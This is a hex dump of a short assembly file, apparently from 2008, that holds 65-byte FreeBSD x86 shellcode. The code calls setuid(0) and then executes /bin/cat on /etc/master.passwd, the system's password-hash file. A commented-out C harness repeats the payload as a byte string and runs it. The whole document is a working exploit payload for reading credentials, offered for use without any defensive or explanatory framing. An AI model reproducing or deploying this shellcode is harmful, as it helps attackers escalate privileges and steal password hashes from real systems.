00000000  3b 20 73 6d 34 78 20 32  30 30 38 0d 0a 3b 20 2f  |; sm4x 2008..; /|
00000010  62 69 6e 2f 63 61 74 20  2f 65 74 63 2f 6d 61 73  |bin/cat /etc/mas|
00000020  74 65 72 2e 70 61 73 73  77 64 0d 0a 3b 20 36 35  |ter.passwd..; 65|
00000030  20 62 79 74 65 73 0d 0a  3b 20 46 72 65 65 42 53  | bytes..; FreeBS|
00000040  44 20 37 2e 30 2d 52 45  4c 45 41 53 45 0d 0a 0d  |D 7.0-RELEASE...|
00000050  0a 67 6c 6f 62 61 6c 20  5f 73 74 61 72 74 0d 0a  |.global _start..|
00000060  5f 73 74 61 72 74 3a 0d  0a 0d 0a 78 6f 72 20 20  |_start:....xor  |
00000070  20 20 20 65 61 78 2c 20  65 61 78 0d 0a 0d 0a 3b  |   eax, eax....;|
00000080  20 2d 2d 2d 20 73 65 74  75 69 64 28 30 29 0d 0a  | --- setuid(0)..|
00000090  70 75 73 68 20 20 20 20  65 61 78 0d 0a 70 75 73  |push    eax..pus|
000000a0  68 20 20 20 20 65 61 78  0d 0a 6d 6f 76 20 20 20  |h    eax..mov   |
000000b0  20 20 61 6c 2c 20 30 78  31 37 0d 0a 69 6e 74 20  |  al, 0x17..int |
000000c0  20 20 20 20 30 78 38 30  0d 0a 0d 0a 3b 20 2d 2d  |    0x80....; --|
000000d0  2d 20 73 65 74 75 70 20  2f 65 74 63 2f 6d 61 73  |- setup /etc/mas|
000000e0  74 65 72 2e 70 61 73 73  77 64 0d 0a 6a 6d 70 20  |ter.passwd..jmp |
000000f0  20 20 20 20 73 68 6f 72  74 20 20 20 6c 6f 61 64  |    short   load|
00000100  5f 66 69 6c 65 0d 0a 6f  6b 3a 0d 0a 70 6f 70 20  |_file..ok:..pop |
00000110  20 20 20 20 65 73 69 0d  0a 0d 0a 3b 20 73 65 74  |    esi....; set|
00000120  75 70 20 2f 62 69 6e 2f  63 61 74 0d 0a 70 75 73  |up /bin/cat..pus|
00000130  68 20 20 20 20 65 61 78  0d 0a 70 75 73 68 20 20  |h    eax..push  |
00000140  20 20 30 78 37 34 36 31  36 33 32 66 0d 0a 70 75  |  0x7461632f..pu|
00000150  73 68 20 20 20 20 30 78  36 65 36 39 36 32 32 66  |sh    0x6e69622f|
00000160  0d 0a 6d 6f 76 20 20 20  20 20 65 62 78 2c 20 65  |..mov     ebx, e|
00000170  73 70 0d 0a 0d 0a 3b 20  2d 2d 2d 20 61 72 72 61  |sp....; --- arra|
00000180  79 20 73 65 74 75 70 0d  0a 70 75 73 68 20 20 20  |y setup..push   |
00000190  20 65 61 78 20 20 20 20  20 3b 20 6e 75 6c 6c 0d  | eax     ; null.|
000001a0  0a 70 75 73 68 20 20 20  20 65 73 69 20 20 20 20  |.push    esi    |
000001b0  20 3b 20 2f 65 74 63 2f  6d 61 73 74 65 72 2e 70  | ; /etc/master.p|
000001c0  61 73 73 77 64 0d 0a 70  75 73 68 20 20 20 20 65  |asswd..push    e|
000001d0  62 78 20 20 20 20 20 3b  20 2f 62 69 6e 2f 63 61  |bx     ; /bin/ca|
000001e0  74 0d 0a 6d 6f 76 20 20  20 20 20 65 64 78 2c 20  |t..mov     edx, |
000001f0  65 73 70 0d 0a 0d 0a 3b  20 2d 2d 20 65 78 65 63  |esp....; -- exec|
00000200  76 65 28 29 0d 0a 70 75  73 68 20 20 20 20 65 61  |ve()..push    ea|
00000210  78 20 20 20 20 20 3b 20  30 0d 0a 70 75 73 68 20  |x     ; 0..push |
00000220  20 20 20 65 64 78 20 20  20 20 20 3b 20 61 72 72  |   edx     ; arr|
00000230  61 79 20 7b 20 22 2f 62  69 6e 2f 63 61 74 22 2c  |ay { "/bin/cat",|
00000240  20 22 2f 65 74 63 2f 6d  61 73 74 65 72 2e 70 61  | "/etc/master.pa|
00000250  73 73 77 64 22 2c 20 30  7d 0d 0a 70 75 73 68 20  |sswd", 0}..push |
00000260  20 20 20 65 62 78 20 20  20 20 20 3b 20 2f 62 69  |   ebx     ; /bi|
00000270  6e 2f 63 61 74 0d 0a 6d  6f 76 20 20 20 20 20 61  |n/cat..mov     a|
00000280  6c 2c 20 30 78 33 62 0d  0a 70 75 73 68 20 20 20  |l, 0x3b..push   |
00000290  20 65 61 78 0d 0a 69 6e  74 20 20 20 20 20 30 78  | eax..int     0x|
000002a0  38 30 0d 0a 0d 0a 3b 20  2d 2d 2d 20 65 78 69 74  |80....; --- exit|
000002b0  0d 0a 70 75 73 68 20 20  20 20 65 61 78 0d 0a 70  |..push    eax..p|
000002c0  75 73 68 20 20 20 20 65  61 78 0d 0a 69 6e 74 20  |ush    eax..int |
000002d0  20 20 20 20 30 78 38 30  0d 0a 0d 0a 6c 6f 61 64  |    0x80....load|
000002e0  5f 66 69 6c 65 3a 0d 0a  63 61 6c 6c 20 20 20 20  |_file:..call    |
000002f0  6f 6b 0d 0a 64 62 20 20  20 20 20 20 27 2f 65 74  |ok..db      '/et|
00000300  63 2f 6d 61 73 74 65 72  2e 70 61 73 73 77 64 27  |c/master.passwd'|
00000310  0d 0a 0d 0a 2f 2a 0d 0a  0d 0a 63 68 61 72 20 63  |..../*....char c|
00000320  6f 64 65 5b 5d 20 3d 20  22 5c 78 33 31 5c 78 63  |ode[] = "\x31\xc|
00000330  30 5c 78 35 30 5c 78 35  30 5c 78 62 30 5c 78 31  |0\x50\x50\xb0\x1|
00000340  37 5c 78 63 64 5c 78 38  30 5c 78 65 62 5c 78 31  |7\xcd\x80\xeb\x1|
00000350  66 22 0d 0a 20 20 20 20  20 20 20 22 5c 78 35 65  |f"..       "\x5e|
00000360  5c 78 35 30 5c 78 36 38  5c 78 32 66 5c 78 36 33  |\x50\x68\x2f\x63|
00000370  5c 78 36 31 5c 78 37 34  5c 78 36 38 5c 78 32 66  |\x61\x74\x68\x2f|
00000380  5c 78 36 32 22 0d 0a 20  20 20 20 20 20 20 22 5c  |\x62"..       "\|
00000390  78 36 39 5c 78 36 65 5c  78 38 39 5c 78 65 33 5c  |x69\x6e\x89\xe3\|
000003a0  78 35 30 5c 78 35 36 5c  78 35 33 5c 78 38 39 5c  |x50\x56\x53\x89\|
000003b0  78 65 32 5c 78 35 30 22  0d 0a 20 20 20 20 20 20  |xe2\x50"..      |
000003c0  20 22 5c 78 35 32 5c 78  35 33 5c 78 62 30 5c 78  | "\x52\x53\xb0\x|
000003d0  33 62 5c 78 35 30 5c 78  63 64 5c 78 38 30 5c 78  |3b\x50\xcd\x80\x|
000003e0  35 30 5c 78 35 30 5c 78  63 64 22 0d 0a 20 20 20  |50\x50\xcd"..   |
000003f0  20 20 20 20 22 5c 78 38  30 5c 78 65 38 5c 78 64  |    "\x80\xe8\xd|
00000400  63 5c 78 66 66 5c 78 66  66 5c 78 66 66 5c 78 32  |c\xff\xff\xff\x2|
00000410  66 5c 78 36 35 5c 78 37  34 5c 78 36 33 22 0d 0a  |f\x65\x74\x63"..|
00000420  20 20 20 20 20 20 20 22  5c 78 32 66 5c 78 36 64  |       "\x2f\x6d|
00000430  5c 78 36 31 5c 78 37 33  5c 78 37 34 5c 78 36 35  |\x61\x73\x74\x65|
00000440  5c 78 37 32 5c 78 32 65  5c 78 37 30 5c 78 36 31  |\x72\x2e\x70\x61|
00000450  22 0d 0a 20 20 20 20 20  20 20 22 5c 78 37 33 5c  |"..       "\x73\|
00000460  78 37 33 5c 78 37 37 5c  78 36 34 22 3b 0d 0a 0d  |x73\x77\x64";...|
00000470  0a 69 6e 74 20 6d 61 69  6e 28 69 6e 74 20 61 72  |.int main(int ar|
00000480  67 63 2c 20 63 68 61 72  20 2a 2a 61 72 67 76 29  |gc, char **argv)|
00000490  20 7b 0d 0a 20 20 20 20  20 20 20 20 69 6e 74 20  | {..        int |
000004a0  28 2a 66 75 6e 63 29 28  29 3b 0d 0a 20 20 20 20  |(*func)();..    |
000004b0  20 20 20 20 70 72 69 6e  74 66 28 22 42 79 74 65  |    printf("Byte|
000004c0  73 3a 20 25 64 5c 6e 22  2c 20 73 69 7a 65 6f 66  |s: %d\n", sizeof|
000004d0  28 63 6f 64 65 29 29 3b  0d 0a 20 20 20 20 20 20  |(code));..      |
000004e0  20 20 66 75 6e 63 20 3d  20 28 69 6e 74 20 28 2a  |  func = (int (*|
000004f0  29 28 29 29 20 63 6f 64  65 3b 0d 0a 20 20 20 20  |)()) code;..    |
00000500  20 20 20 20 28 69 6e 74  29 28 2a 66 75 6e 63 29  |    (int)(*func)|
00000510  28 29 3b 0d 0a 7d 0d 0a  0d 0a 2a 2f              |();..}....*/|
0000051c
